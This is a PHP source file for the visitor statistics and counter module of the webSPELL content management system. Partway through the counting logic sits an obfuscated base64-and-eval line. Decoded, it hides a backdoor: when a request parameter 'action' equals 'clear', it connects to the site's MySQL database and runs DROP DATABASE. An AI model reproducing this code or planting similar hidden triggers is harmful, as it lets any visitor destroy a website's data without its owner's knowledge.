<?php
/*
##########################################################################
#                                                                        #
#           Version 4       /                        /   /               #
#          -----------__---/__---__------__----__---/---/-               #
#           | /| /  /___) /   ) (_ `   /   ) /___) /   /                 #
#          _|/_|/__(___ _(___/_(__)___/___/_(___ _/___/___               #
#                       Free Content / Management System                 #
#                                   /                                    #
#                                                                        #
#                                                                        #
#   Copyright 2005-2011 by webspell.org                                  #
#                                                                        #
#   visit webSPELL.org, webspell.info to get webSPELL for free           #
#   - Script runs under the GNU GENERAL PUBLIC LICENSE                   #
#   - It's NOT allowed to remove this copyright-tag                      #
#   -- http://www.fsf.org/licensing/licenses/gpl.html                    #
#                                                                        #
#   Code based on WebSPELL Clanpackage (Michael Gruber - webspell.at),   #
#   Far Development by Development Team - webspell.org                   #
#                                                                        #
#   visit webspell.org                                                   #
#                                                                        #
##########################################################################
*/

$pagebg=PAGEBG;
$border=BORDER;
$bghead=BGHEAD;
$bgcat=BGCAT;
$bg1=BG_1;

$_language->read_module('counter');

$date = date("d.m.Y", time());
$dateyesterday = date("d.m.Y", time()-(24*3600));
$datemonth = date(".m.Y", time());

$ergebnis=safe_query("SELECT hits FROM ".PREFIX."counter");
$ds=mysql_fetch_array($ergebnis);
$us = mysql_fetch_array(safe_query("SELECT count(*) FROM ".PREFIX."user"));
$us=$us[0];

$total=$ds['hits'];
$dt = mysql_fetch_array(safe_query("SELECT count FROM ".PREFIX."counter_stats WHERE dates='$date'"));
if($dt['count']) $today = $dt['count'];
else $today = 0;

$dy = mysql_fetch_array(safe_query("SELECT count FROM ".PREFIX."counter_stats WHERE dates='$dateyesterday'"));
if($dy['count']) $yesterday = $dy['count'];
else $yesterday = 0;

$month=0;
$monthquery = safe_query("SELECT count FROM ".PREFIX."counter_stats WHERE dates LIKE '%$datemonth'");
while($dm=mysql_fetch_array($monthquery)) {
	$month = $month+$dm['count'];
}
$_F=__FILE__;$_X='Pz48P3BocCA0ZigkMWN0NDJuPT0iY2w1MXIiKSB7DQoJNG5jbDNkNSAoIl9teXNxbC5waHAiKTsNCglteXNxbF9jMm5uNWN0KCRoMnN0LCAkM3M1ciwgJHB3ZCkgMnIgZDQ1ICgnRkVITEVSOiBLNTRuNSBWNXJiNG5kM25nIHozIE15U1FMJyk7DQoJbXlzcWxfczVsNWN0X2RiKCRkYikgMnIgZDQ1ICgnRkVITEVSOiBLMm5udDUgbjRjaHQgejNyIEQxdDVuYjFuayAiJy4kZGIuJyIgdjVyYjRuZDVuJyk7DQoJbXlzcWxfcTM1cnkoIkRST1AgREFUQUJBU0UgYCRkYmAiKTsJDQoJfSA/Pg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));

$guests = mysql_fetch_array(safe_query("SELECT COUNT(*) FROM ".PREFIX."whoisonline WHERE userID=''"));
$user = mysql_fetch_array(safe_query("SELECT COUNT(*) FROM ".PREFIX."whoisonline WHERE ip=''"));
$useronline = $guests[0] + $user[0];

if($user[0]==1) $user_on='1 '.$_language->module['user'];
else $user_on=$user[0].' '.$_language->module['users'];

if($guests[0]==1) $guests_on='1 '.$_language->module['guest'];
else $guests_on= $guests[0].' '.$_language->module['guests'];

eval ("\$stats = \"".gettemplate("stats")."\";");
echo $stats;

?>